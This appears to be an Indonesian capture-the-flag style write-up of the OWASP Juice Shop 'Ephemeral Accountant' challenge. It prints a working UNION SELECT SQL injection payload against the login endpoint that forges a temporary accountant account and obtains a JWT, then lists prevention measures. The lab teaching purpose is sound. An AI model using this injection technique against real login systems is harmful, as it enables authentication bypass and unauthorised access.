# Juice-Shop Write-up: Ephemeral Accountant

Kategori: SQL Injection  
Tingkat Kesulitan: ⭐⭐⭐⭐ (4/6)  

Deskripsi: Mengeksploitasi kerentanan **SQL Injection** pada fitur login untuk membuat akun sementara (`acc0unt4nt@juice-sh.op`) tanpa benar-benar menyimpannya ke database.

## Link Resource
https://demo.owasp-juice.shop/#/

## Jawaban + Bukti
### a. Step-by-step
1. **Analisis Login**  
   - Endpoint `/rest/user/login` menerima request `POST` dengan payload email & password.  
   - Contoh normal:  
     ```http
     POST /rest/user/login
     {
       "email": "user@example.com",
       "password": "password123"
     }
     ```

2. **Menyusun Payload SQLi**  
   - Tujuan: membuat row sementara dengan data user baru.  
   - Payload disusun dengan `UNION SELECT` agar aplikasi mengira ada akun valid.  

   ```http
   POST /rest/user/login
   {
     "email": "' UNION SELECT * FROM (SELECT 20 AS id, 'acc0unt4nt@juice-sh.op' AS email, 'test1234' AS password, 'accounting' AS role, '123' AS deluxeToken, '/assets/public/images/uploads/default.svg' AS profileImage, 1 AS isActive, 12983283 AS createdAt, 133424 AS updatedAt, NULL AS deletedAt) AS tmp WHERE '1'='1';--",
     "password": "test1234"
   }

3. **Eksekusi & Hasil**
- Server merespon dengan JWT token, menandakan login berhasil.
- User acc0unt4nt@juice-sh.op dianggap ada hanya selama query berjalan.

### b. Catatan Hasil Percobaan

**Status:** Berhasil login sebagai user sementara.

#### Alasan Keberhasilan
- Query tidak divalidasi.
- UNION SELECT menambahkan row palsu.
- Aplikasi hanya mengecek hasil query, bukan data permanen di database.

#### Refleksi
- **Risiko:** Penyerang dapat membuat akun fiktif dan login tanpa registrasi.
- **Pencegahan:**  
  - Gunakan prepared statements / parameterized queries.
  - Validasi bahwa user benar-benar ada di database.
  - Sanitasi input agar tidak bisa dieksekusi sebagai kode SQL.

### c. Dokumentasi
<img width="1919" height="997" alt="image" src="https://github.com/user-attachments/assets/fb41939d-328c-4983-b4f2-02516b42c4e3" />

<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/be620229-906e-4a59-8dc5-b8b9d9966c7d" />


